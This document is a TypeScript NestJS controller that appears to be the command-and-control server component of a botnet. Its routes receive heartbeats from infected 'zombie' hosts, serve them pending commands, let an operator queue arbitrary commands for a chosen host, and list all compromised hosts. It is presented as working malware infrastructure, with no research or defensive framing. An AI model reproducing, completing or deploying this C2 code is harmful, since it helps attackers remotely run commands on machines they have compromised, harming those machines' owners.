// src/host/host.controller.ts
import { Controller, Post, Get, Body, Query, Req, Res } from '@nestjs/common';
import { ZombieService  } from './zombie.service'
import { HeartbeetData } from './dto/HeartbeetData.dto';
import { Request, Response } from 'express';
import {v4 as uuidv4} from 'uuid';

@Controller()
export class ZombieController {
  constructor(private readonly zombieService: ZombieService) {}

  // Host heartbeet
  @Post('hb')
  async receiveHeartbeat(
    @Body() c2Data: HeartbeetData,
    @Req() req: Request,
    @Res() res: Response
  )
  {
    const clientIp = req.socket.remoteAddress || 'unknown';
    const clientPort = req.socket.remotePort || 0;
    await this.zombieService.heartbeet(c2Data, clientIp, clientPort);
    return res.status(200).json({ status: 'success' });
  }

  // Check Pending Commands
  @Get('cpc')
  async checkPendingCommands(@Query('h') hostname: string) {
    const commands = await this.zombieService.getPendingCommands(hostname);
    return { hostname, pending_commands: commands };
  }

  // Send command to host (store the command on db)
  @Post('send_command')
  async sendCommand(@Query('hostname') hostname: string, @Query('command') command: string) {
    const uuid = uuidv4();
    const updated = await this.zombieService.addCommand(hostname, command);
    
    return { hostname, pending_commands: updated };
    
  }

  // Get hosts
  @Get('get_hosts')
  async getHosts() {
    return this.zombieService.getHosts();
  }
}
